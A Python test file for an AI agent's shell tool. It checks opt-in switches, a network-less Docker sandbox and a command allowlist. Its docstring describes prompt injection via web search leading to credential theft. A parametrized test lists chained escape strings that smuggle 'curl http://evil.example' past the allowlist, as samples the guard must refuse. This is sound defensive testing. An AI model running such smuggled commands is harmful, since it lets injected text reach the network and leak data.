"""The shell capability: whether it exists, where it runs, and what it may run.

0.2.0 removed the shipped shell server because a shell beside a web-search tool
is an injection path to credential exfiltration. Every assertion here is about
that reasoning still holding now that the shell is the feature, so each one is
worth breaking on purpose before trusting it.
"""

from __future__ import annotations

import pytest

from mcp_agent.profiles import Profile, ShellSettings
from mcp_agent.shell import (
    SHELL_TOOL_NAME,
    build_execution_policy,
    build_shell_middleware,
    configured_policy,
    resolve_policy,
    shell_enabled,
)


def _profile(**shell: object) -> Profile:
    settings = {"enabled": True, "allow": ("ls", "git")}
    settings.update(shell)
    return Profile(name="p", shell=ShellSettings(**settings))  # type: ignore[arg-type]


# --- Two switches, both of which must be on ------------------------------------


def test_the_operator_switch_is_off_unless_set(monkeypatch):
    monkeypatch.delenv("MCP_ENABLE_SHELL", raising=False)
    assert shell_enabled() is False


@pytest.mark.parametrize("value", ["", "1", "yes", "TRUE ", "false", "no"])
def test_only_the_word_true_enables_the_shell(monkeypatch, value):
    """`1` and `yes` look like consent and are not it.

    `TRUE ` is: the value is stripped and lowered, so an operator who typed a
    trailing space still gets what they asked for.
    """
    monkeypatch.setenv("MCP_ENABLE_SHELL", value)
    assert shell_enabled() is (value.strip().lower() == "true")


def test_a_profile_alone_does_not_get_a_shell(monkeypatch):
    """A profile is a file someone may have been handed."""
    monkeypatch.delenv("MCP_ENABLE_SHELL", raising=False)
    assert build_shell_middleware(_profile()) == []


def test_the_operator_switch_alone_does_not_get_a_shell(monkeypatch):
    monkeypatch.setenv("MCP_ENABLE_SHELL", "true")
    assert build_shell_middleware(Profile(name="p")) == []


def test_both_switches_build_the_shell_and_its_guard(monkeypatch):
    monkeypatch.setenv("MCP_ENABLE_SHELL", "true")

    built = build_shell_middleware(_profile())

    names = [type(m).__name__ for m in built]
    assert names == ["ShellAllowlistMiddleware", "ShellToolMiddleware"], names


def test_the_guard_comes_before_the_tool_it_guards(monkeypatch):
    """Listed after, it would wrap nothing that matters."""
    monkeypatch.setenv("MCP_ENABLE_SHELL", "true")

    built = build_shell_middleware(_profile())

    assert type(built[0]).__name__ == "ShellAllowlistMiddleware"
    assert any(tool.name == SHELL_TOOL_NAME for tool in built[1].tools)


# --- Where a command runs -------------------------------------------------------


def test_the_default_policy_is_a_sandbox_with_no_network(monkeypatch):
    """`network_enabled=False` is the half of the 0.2.0 attack this closes."""
    monkeypatch.delenv("MCP_SHELL_POLICY", raising=False)

    policy = build_execution_policy(_profile())

    assert type(policy).__name__ == "DockerExecutionPolicy"
    assert policy.network_enabled is False
    assert policy.read_only_rootfs is True
    assert policy.user == "nobody"


def test_the_profile_command_timeout_reaches_the_policy(monkeypatch):
    monkeypatch.delenv("MCP_SHELL_POLICY", raising=False)
    assert build_execution_policy(_profile(command_timeout=12)).command_timeout == 12


def test_a_profile_asking_for_the_host_is_sandboxed_anyway(monkeypatch):
    """A profile must not be able to opt a deployment out of its sandbox."""
    monkeypatch.delenv("MCP_SHELL_POLICY", raising=False)

    assert resolve_policy(_profile(policy="host")) == "docker"
    assert type(build_execution_policy(_profile(policy="host"))).__name__ == (
        "DockerExecutionPolicy"
    )


def test_the_host_policy_needs_both_the_profile_and_the_operator(monkeypatch):
    monkeypatch.setenv("MCP_SHELL_POLICY", "host")

    assert resolve_policy(_profile(policy="host")) == "host"
    assert type(build_execution_policy(_profile(policy="host"))).__name__ == ("HostExecutionPolicy")


def test_the_operator_alone_does_not_move_a_profile_to_the_host(monkeypatch):
    """MCP_SHELL_POLICY=host permits the host; it does not impose it."""
    monkeypatch.setenv("MCP_SHELL_POLICY", "host")
    assert resolve_policy(_profile(policy="docker")) == "docker"


@pytest.mark.parametrize("bad", ["", "yolo", "DOCKER!"])
def test_a_meaningless_policy_override_is_ignored(monkeypatch, bad):
    monkeypatch.setenv("MCP_SHELL_POLICY", bad)
    assert configured_policy() is None
    assert resolve_policy(_profile()) == "docker"


def test_the_policy_override_is_case_insensitive(monkeypatch):
    monkeypatch.setenv("MCP_SHELL_POLICY", " Host ")
    assert configured_policy() == "host"


# --- What the guard lets through ------------------------------------------------


def _run_guard(profile: Profile, command, *, tool_name: str = SHELL_TOOL_NAME):
    """Put one tool call through the guard, recording whether it reached the tool."""
    from mcp_agent.shell import build_allowlist_guard

    guard = build_allowlist_guard(profile)
    reached: list = []

    class Request:
        tool_call = {"name": tool_name, "args": {"command": command}, "id": "call-1"}

    def handler(request):
        reached.append(request)
        return "the tool ran"

    return guard.wrap_tool_call(Request(), handler), reached


def test_a_listed_command_reaches_the_tool():
    result, reached = _run_guard(_profile(), "ls -la")
    assert reached, "an allowed command was blocked"
    assert result == "the tool ran"


def test_an_unlisted_command_never_reaches_the_tool():
    result, reached = _run_guard(_profile(), "curl http://example.com")

    assert not reached, "a refused command reached the shell"
    assert result.status == "error"
    assert "does not permit" in result.content


def test_a_refusal_is_a_tool_result_not_an_exception():
    """An exception here strands the tool_use/tool_result pair.

    That is the failure 0.4.1 fixed for timeouts: the thread is checkpointed
    with a call and no result, and every later turn on it is rejected. A
    refusal has to close the pair so the model can pick something else.
    """
    result, _ = _run_guard(_profile(), "curl http://example.com")

    assert result.tool_call_id == "call-1"
    assert result.name == SHELL_TOOL_NAME


def test_the_refusal_says_what_is_permitted():
    result, _ = _run_guard(_profile(), "curl http://example.com")
    assert "git, ls" in result.content


@pytest.mark.parametrize(
    "command",
    [
        "ls && curl http://evil.example",
        "ls; curl http://evil.example",
        "ls | curl http://evil.example",
        "ls & curl http://evil.example",
        "ls\ncurl http://evil.example",
        "ls $(curl http://evil.example)",
        "ls `curl http://evil.example`",
        "ls <(curl http://evil.example)",
    ],
)
def test_a_chained_escape_is_refused(command):
    """The shell tool's own description tells the model to chain with `&&`.

    Reproduced before this guard existed: an allowlist of `ls` accepted
    `ls && curl ...` because it read only the first word.
    """
    _, reached = _run_guard(_profile(), command)
    assert not reached, f"{command!r} reached the shell"


def test_a_chain_of_listed_commands_is_still_allowed():
    """The rule is every segment, not "no chaining"."""
    _, reached = _run_guard(_profile(), "ls && git status")
    assert reached


def test_another_tool_is_not_the_guard_s_business():
    """It wraps every tool call; only the shell's are its own."""
    _, reached = _run_guard(_profile(), "curl http://evil.example", tool_name="search")
    assert reached, "the guard blocked a call to a different tool"


def test_a_restart_carries_no_command_and_is_passed_through():
    """`restart: true` runs nothing; refusing it would break session recovery."""
    _, reached = _run_guard(_profile(), None)
    assert reached
